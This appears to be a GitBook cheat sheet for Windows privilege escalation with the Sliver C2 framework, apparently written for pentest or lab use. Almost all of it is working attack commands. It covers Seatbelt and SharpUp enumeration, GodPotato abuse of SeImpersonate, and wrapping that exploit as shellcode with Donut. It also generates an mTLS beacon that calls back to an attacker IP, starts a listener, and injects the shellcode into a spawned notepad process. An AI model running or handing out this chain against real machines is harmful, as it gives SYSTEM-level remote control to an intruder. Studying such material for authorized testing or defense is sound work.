---
description: >-
  Many of the below commands are built into slivers armory, please install the
  armory extensions
---

# Privilege Escalation

#### Enumeration

```
seatbelt -- -group=all
sharpup -- audit
```

#### SeImpersonate

[https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

```
execute-assembly /home/kali/GodPotato-NET4.exe -cmd "whoami"
```

Donut can be used to create shellcode out of a .NET assembly and pass it arguments

Setup donut with the following commands

```bash
git clone https://github.com/TheWover/donut
cd donut/
make -f Makefile
./donut 
```

Next create a mtls beacon

```bash
generate beacon --mtls 10.10.14.62:9001 -N mtls-beacon
```

upload the beacon

```bash
upload http-beacon.exe
```

start the listener

```bash
mtls --lhost <lhost> --lport 9001
```

{% code overflow="wrap" %}
```bash
./donut -i /home/kali/GodPotato-NET4.exe -a 2 -b 1 -p '-cmd c:\http-beacon.exe' -o /home/kali/potato.bin
```
{% endcode %}

Next, create a process to inject into

{% code overflow="wrap" %}
```bash
execute-assembly /home/kali/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
```
{% endcode %}

Then execute the shellcode into that PID

```
execute-shellcode -p 5668 /home/kali/potato.bin
```
